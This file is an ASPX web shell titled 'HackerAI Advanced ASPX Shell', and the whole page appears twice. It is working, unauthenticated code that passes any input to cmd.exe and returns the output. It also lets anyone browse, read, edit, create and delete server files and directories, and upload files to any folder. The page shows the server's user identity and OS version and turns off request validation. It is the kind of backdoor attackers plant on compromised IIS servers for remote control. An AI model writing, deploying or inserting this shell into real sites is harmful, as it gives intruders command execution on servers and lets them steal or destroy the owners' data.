<%@ Page Language="C#" Debug="true" Trace="false" ValidateRequest="false" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Security.Principal" %>

<!DOCTYPE html>
<html>
<head>
    <title>HackerAI Advanced ASPX Shell</title>
    <style>
        body { font-family: "Consolas", monospace; font-size: 13px; background: #1e1e1e; color: #d4d4d4; margin: 20px; }
        .container { border: 1px solid #333; padding: 15px; background: #252526; border-radius: 4px; }
        .header { border-bottom: 2px solid #007acc; margin-bottom: 15px; padding-bottom: 10px; color: #007acc; }
        input[type="text"], textarea { background: #3c3c3c; border: 1px solid #555; color: #fff; padding: 5px; width: 100%; box-sizing: border-box; }
        textarea { height: 250px; margin-top: 10px; }
        .btn { background: #007acc; color: white; border: none; padding: 6px 12px; cursor: pointer; margin-top: 5px; }
        .btn:hover { background: #005a9e; }
        .file-list { width: 100%; border-collapse: collapse; margin-top: 15px; }
        .file-list th, .file-list td { text-align: left; padding: 8px; border: 1px solid #333; }
        .file-list tr:hover { background: #2d2d30; }
        .path-nav { color: #ce9178; margin-bottom: 10px; display: block; }
        .info-panel { margin-bottom: 15px; font-size: 12px; color: #858585; }
        .cmd-output { background: #000; color: #0f0; padding: 10px; margin-top: 10px; white-space: pre-wrap; border: 1px solid #444; }
    </style>
</head>
<body>
    <div class="container">
        <h2 class="header">Advanced ASPX Management Shell</h2>
        
        <div class="info-panel">
            <strong>User:</strong> <asp:Label ID="lblUser" runat="server" /> | 
            <strong>OS:</strong> <asp:Label ID="lblOS" runat="server" /> | 
            <strong>Server Time:</strong> <%= DateTime.Now.ToString() %>
        </div>

        <form id="form1" runat="server">
            <!-- Path Navigation -->
            <div class="path-nav">
                Current Dir: <asp:TextBox ID="txtCurrentDir" runat="server" style="width:80%;" />
                <asp:Button ID="btnGo" runat="server" Text="Go" OnClick="Refresh_Click" CssClass="btn" />
            </div>

            <!-- Command Execution -->
            <fieldset style="border:1px solid #444; margin-bottom:15px;">
                <legend>Command Execution</legend>
                <asp:TextBox ID="txtCmd" runat="server" placeholder="whoami /all" style="width:85%;" />
                <asp:Button ID="btnRun" runat="server" Text="Execute" OnClick="btnRun_Click" CssClass="btn" />
                <asp:Panel ID="pnlCmd" runat="server" Visible="false" CssClass="cmd-output">
                    <asp:Literal ID="litCmdOut" runat="server" />
                </asp:Panel>
            </fieldset>

            <!-- File Operations -->
            <div style="display:flex; gap:20px;">
                <div style="flex:1;">
                    <fieldset style="border:1px solid #444;">
                        <legend>File Explorer & Editor</legend>
                        <asp:TextBox ID="txtFileName" runat="server" placeholder="filename.txt" />
                        <asp:Button ID="btnEdit" runat="server" Text="Read/Edit" OnClick="btnEdit_Click" CssClass="btn" />
                        <asp:Button ID="btnSave" runat="server" Text="Save/Create" OnClick="btnSave_Click" CssClass="btn" />
                        <asp:Button ID="btnDelete" runat="server" Text="Delete" OnClick="btnDelete_Click" CssClass="btn" OnClientClick="return confirm('Delete?');" />
                        <asp:TextBox ID="txtContent" runat="server" TextMode="MultiLine" />
                    </fieldset>
                </div>
                
                <div style="width:300px;">
                    <fieldset style="border:1px solid #444;">
                        <legend>Upload</legend>
                        <asp:FileUpload ID="uplaoder" runat="server" /><br />
                        <asp:Button ID="btnUpload" runat="server" Text="Upload to Current Dir" OnClick="btnUpload_Click" CssClass="btn" />
                    </fieldset>
                </div>
            </div>

            <!-- File List -->
            <asp:GridView ID="gvFiles" runat="server" AutoGenerateColumns="false" CssClass="file-list" OnRowCommand="gvFiles_RowCommand">
                <Columns>
                    <asp:TemplateField HeaderText="Name">
                        <ItemTemplate>
                            <asp:LinkButton ID="lnkFile" runat="server" CommandName="SelectFile" CommandArgument='<%# Eval("Name") %>' Text='<%# Eval("Name") %>' ForeColor="#4ec9b0" />
                        </ItemTemplate>
                    </asp:TemplateField>
                    <asp:BoundField DataField="Size" HeaderText="Size (Bytes)" />
                    <asp:BoundField DataField="LastWriteTime" HeaderText="Modified" />
                </Columns>
            </asp:GridView>
        </form>
    </div>

    <script runat="server">
        protected void Page_Load(object sender, EventArgs e) {
            if (!IsPostBack) {
                txtCurrentDir.Text = Server.MapPath(".");
                lblUser.Text = WindowsIdentity.GetCurrent().Name;
                lblOS.Text = Environment.OSVersion.ToString();
                BindFileList();
            }
        }

        private void BindFileList() {
            try {
                DirectoryInfo di = new DirectoryInfo(txtCurrentDir.Text);
                var files = di.GetFileSystemInfos().Select(f => new {
                    Name = f.Name + (f is DirectoryInfo ? "/" : ""),
                    Size = (f is FileInfo) ? ((FileInfo)f).Length.ToString() : "-",
                    f.LastWriteTime
                }).ToList();
                gvFiles.DataSource = files;
                gvFiles.DataBind();
            } catch (Exception ex) {
                litCmdOut.Text = "Error: " + ex.Message;
                pnlCmd.Visible = true;
            }
        }

        protected void Refresh_Click(object sender, EventArgs e) { BindFileList(); }

        protected void btnRun_Click(object sender, EventArgs e) {
            try {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c " + txtCmd.Text;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.UseShellExecute = false;
                psi.WorkingDirectory = txtCurrentDir.Text;
                
                using (Process p = Process.Start(psi)) {
                    string output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                    litCmdOut.Text = Server.HtmlEncode(output);
                    pnlCmd.Visible = true;
                }
            } catch (Exception ex) {
                litCmdOut.Text = "Exec Error: " + ex.Message;
                pnlCmd.Visible = true;
            }
        }

        protected void btnEdit_Click(object sender, EventArgs e) {
            try {
                string path = Path.Combine(txtCurrentDir.Text, txtFileName.Text);
                txtContent.Text = File.ReadAllText(path);
            } catch (Exception ex) { litCmdOut.Text = ex.Message; pnlCmd.Visible = true; }
        }

        protected void btnSave_Click(object sender, EventArgs e) {
            try {
                string path = Path.Combine(txtCurrentDir.Text, txtFileName.Text);
                File.WriteAllText(path, txtContent.Text);
                BindFileList();
            } catch (Exception ex) { litCmdOut.Text = ex.Message; pnlCmd.Visible = true; }
        }

        protected void btnDelete_Click(object sender, EventArgs e) {
            try {
                string path = Path.Combine(txtCurrentDir.Text, txtFileName.Text);
                if (File.Exists(path)) File.Delete(path);
                else if (Directory.Exists(path)) Directory.Delete(path, true);
                BindFileList();
            } catch (Exception ex) { litCmdOut.Text = ex.Message; pnlCmd.Visible = true; }
        }

        protected void btnUpload_Click(object sender, EventArgs e) {
            try {
                if (uplaoder.HasFile) {
                    uplaoder.SaveAs(Path.Combine(txtCurrentDir.Text, uplaoder.FileName));
                    BindFileList();
                }
            } catch (Exception ex) { litCmdOut.Text = ex.Message; pnlCmd.Visible = true; }
        }

        protected void gvFiles_RowCommand(object sender, GridViewCommandEventArgs e) {
            if (e.CommandName == "SelectFile") {
                string name = e.CommandArgument.ToString();
                if (name.EndsWith("/")) {
                    txtCurrentDir.Text = Path.GetFullPath(Path.Combine(txtCurrentDir.Text, name));
                    BindFileList();
                } else {
                    txtFileName.Text = name;
                    btnEdit_Click(null, null);
                }
            }
        }
    </script>
</body>
</html><%@ Page Language="C#" Debug="true" Trace="false" ValidateRequest="false" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Security.Principal" %>

<!DOCTYPE html>
<html>
<head>
    <title>HackerAI Advanced ASPX Shell</title>
    <style>
        body { font-family: "Consolas", monospace; font-size: 13px; background: #1e1e1e; color: #d4d4d4; margin: 20px; }
        .container { border: 1px solid #333; padding: 15px; background: #252526; border-radius: 4px; }
        .header { border-bottom: 2px solid #007acc; margin-bottom: 15px; padding-bottom: 10px; color: #007acc; }
        input[type="text"], textarea { background: #3c3c3c; border: 1px solid #555; color: #fff; padding: 5px; width: 100%; box-sizing: border-box; }
        textarea { height: 250px; margin-top: 10px; }
        .btn { background: #007acc; color: white; border: none; padding: 6px 12px; cursor: pointer; margin-top: 5px; }
        .btn:hover { background: #005a9e; }
        .file-list { width: 100%; border-collapse: collapse; margin-top: 15px; }
        .file-list th, .file-list td { text-align: left; padding: 8px; border: 1px solid #333; }
        .file-list tr:hover { background: #2d2d30; }
        .path-nav { color: #ce9178; margin-bottom: 10px; display: block; }
        .info-panel { margin-bottom: 15px; font-size: 12px; color: #858585; }
        .cmd-output { background: #000; color: #0f0; padding: 10px; margin-top: 10px; white-space: pre-wrap; border: 1px solid #444; }
    </style>
</head>
<body>
    <div class="container">
        <h2 class="header">Advanced ASPX Management Shell</h2>
        
        <div class="info-panel">
            <strong>User:</strong> <asp:Label ID="lblUser" runat="server" /> | 
            <strong>OS:</strong> <asp:Label ID="lblOS" runat="server" /> | 
            <strong>Server Time:</strong> <%= DateTime.Now.ToString() %>
        </div>

        <form id="form1" runat="server">
            <!-- Path Navigation -->
            <div class="path-nav">
                Current Dir: <asp:TextBox ID="txtCurrentDir" runat="server" style="width:80%;" />
                <asp:Button ID="btnGo" runat="server" Text="Go" OnClick="Refresh_Click" CssClass="btn" />
            </div>

            <!-- Command Execution -->
            <fieldset style="border:1px solid #444; margin-bottom:15px;">
                <legend>Command Execution</legend>
                <asp:TextBox ID="txtCmd" runat="server" placeholder="whoami /all" style="width:85%;" />
                <asp:Button ID="btnRun" runat="server" Text="Execute" OnClick="btnRun_Click" CssClass="btn" />
                <asp:Panel ID="pnlCmd" runat="server" Visible="false" CssClass="cmd-output">
                    <asp:Literal ID="litCmdOut" runat="server" />
                </asp:Panel>
            </fieldset>

            <!-- File Operations -->
            <div style="display:flex; gap:20px;">
                <div style="flex:1;">
                    <fieldset style="border:1px solid #444;">
                        <legend>File Explorer & Editor</legend>
                        <asp:TextBox ID="txtFileName" runat="server" placeholder="filename.txt" />
                        <asp:Button ID="btnEdit" runat="server" Text="Read/Edit" OnClick="btnEdit_Click" CssClass="btn" />
                        <asp:Button ID="btnSave" runat="server" Text="Save/Create" OnClick="btnSave_Click" CssClass="btn" />
                        <asp:Button ID="btnDelete" runat="server" Text="Delete" OnClick="btnDelete_Click" CssClass="btn" OnClientClick="return confirm('Delete?');" />
                        <asp:TextBox ID="txtContent" runat="server" TextMode="MultiLine" />
                    </fieldset>
                </div>
                
                <div style="width:300px;">
                    <fieldset style="border:1px solid #444;">
                        <legend>Upload</legend>
                        <asp:FileUpload ID="uplaoder" runat="server" /><br />
                        <asp:Button ID="btnUpload" runat="server" Text="Upload to Current Dir" OnClick="btnUpload_Click" CssClass="btn" />
                    </fieldset>
                </div>
            </div>

            <!-- File List -->
            <asp:GridView ID="gvFiles" runat="server" AutoGenerateColumns="false" CssClass="file-list" OnRowCommand="gvFiles_RowCommand">
                <Columns>
                    <asp:TemplateField HeaderText="Name">
                        <ItemTemplate>
                            <asp:LinkButton ID="lnkFile" runat="server" CommandName="SelectFile" CommandArgument='<%# Eval("Name") %>' Text='<%# Eval("Name") %>' ForeColor="#4ec9b0" />
                        </ItemTemplate>
                    </asp:TemplateField>
                    <asp:BoundField DataField="Size" HeaderText="Size (Bytes)" />
                    <asp:BoundField DataField="LastWriteTime" HeaderText="Modified" />
                </Columns>
            </asp:GridView>
        </form>
    </div>

    <script runat="server">
        protected void Page_Load(object sender, EventArgs e) {
            if (!IsPostBack) {
                txtCurrentDir.Text = Server.MapPath(".");
                lblUser.Text = WindowsIdentity.GetCurrent().Name;
                lblOS.Text = Environment.OSVersion.ToString();
                BindFileList();
            }
        }

        private void BindFileList() {
            try {
                DirectoryInfo di = new DirectoryInfo(txtCurrentDir.Text);
                var files = di.GetFileSystemInfos().Select(f => new {
                    Name = f.Name + (f is DirectoryInfo ? "/" : ""),
                    Size = (f is FileInfo) ? ((FileInfo)f).Length.ToString() : "-",
                    f.LastWriteTime
                }).ToList();
                gvFiles.DataSource = files;
                gvFiles.DataBind();
            } catch (Exception ex) {
                litCmdOut.Text = "Error: " + ex.Message;
                pnlCmd.Visible = true;
            }
        }

        protected void Refresh_Click(object sender, EventArgs e) { BindFileList(); }

        protected void btnRun_Click(object sender, EventArgs e) {
            try {
                ProcessStartInfo psi = new ProcessStartInfo();
                psi.FileName = "cmd.exe";
                psi.Arguments = "/c " + txtCmd.Text;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError = true;
                psi.UseShellExecute = false;
                psi.WorkingDirectory = txtCurrentDir.Text;
                
                using (Process p = Process.Start(psi)) {
                    string output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
                    litCmdOut.Text = Server.HtmlEncode(output);
                    pnlCmd.Visible = true;
                }
            } catch (Exception ex) {
                litCmdOut.Text = "Exec Error: " + ex.Message;
                pnlCmd.Visible = true;
            }
        }

        protected void btnEdit_Click(object sender, EventArgs e) {
            try {
                string path = Path.Combine(txtCurrentDir.Text, txtFileName.Text);
                txtContent.Text = File.ReadAllText(path);
            } catch (Exception ex) { litCmdOut.Text = ex.Message; pnlCmd.Visible = true; }
        }

        protected void btnSave_Click(object sender, EventArgs e) {
            try {
                string path = Path.Combine(txtCurrentDir.Text, txtFileName.Text);
                File.WriteAllText(path, txtContent.Text);
                BindFileList();
            } catch (Exception ex) { litCmdOut.Text = ex.Message; pnlCmd.Visible = true; }
        }

        protected void btnDelete_Click(object sender, EventArgs e) {
            try {
                string path = Path.Combine(txtCurrentDir.Text, txtFileName.Text);
                if (File.Exists(path)) File.Delete(path);
                else if (Directory.Exists(path)) Directory.Delete(path, true);
                BindFileList();
            } catch (Exception ex) { litCmdOut.Text = ex.Message; pnlCmd.Visible = true; }
        }

        protected void btnUpload_Click(object sender, EventArgs e) {
            try {
                if (uplaoder.HasFile) {
                    uplaoder.SaveAs(Path.Combine(txtCurrentDir.Text, uplaoder.FileName));
                    BindFileList();
                }
            } catch (Exception ex) { litCmdOut.Text = ex.Message; pnlCmd.Visible = true; }
        }

        protected void gvFiles_RowCommand(object sender, GridViewCommandEventArgs e) {
            if (e.CommandName == "SelectFile") {
                string name = e.CommandArgument.ToString();
                if (name.EndsWith("/")) {
                    txtCurrentDir.Text = Path.GetFullPath(Path.Combine(txtCurrentDir.Text, name));
                    BindFileList();
                } else {
                    txtFileName.Text = name;
                    btnEdit_Click(null, null);
                }
            }
        }
    </script>
</body>
</html>
